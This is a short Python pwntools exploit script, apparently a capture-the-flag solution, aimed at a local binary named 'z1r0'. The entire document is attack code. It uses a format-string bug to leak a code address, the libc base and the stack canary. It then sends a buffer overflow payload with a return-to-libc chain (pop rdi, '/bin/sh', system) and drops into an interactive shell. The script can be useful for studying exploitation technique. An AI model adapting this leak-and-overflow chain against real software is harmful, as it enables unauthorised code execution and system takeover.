from pwn import *


file_name = './z1r0'
debug = 0

if debug:
    r = remote()
else:
    r = process(file_name)

elf = ELF(file_name)


libc = ELF('./2.23/libc-2.23.so')

def dbg():
    gdb.attach(r)


r.sendline('1')

r.recvuntil('0x')

vuln_addr  = int(r.recv(12), 16)
success('vuln_addr = ' + hex(vuln_addr))

offest = vuln_addr - 0x9b9

r.sendline('2')
r.recvuntil('hello\n')

r.sendline('%3$p+%27$p')

libc_base = int(r.recvuntil("+", drop=True), 16) - (0x7f3c9335d360 - 0x7f3c93266000)
success('libc_base = ' + hex(libc_base))

canary=int(r.recvuntil("\n",drop=True),16)
success('canary = ' + hex(canary))

pop_rdi = libc_base + 0x21112

bin_sh = libc.search(b"/bin/sh").__next__() + libc_base
system_addr = libc_base + libc.sym['system']

p = b'a' * 0x68 + p64(canary) + p64(0) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)

r.sendline(p)




r.interactive()
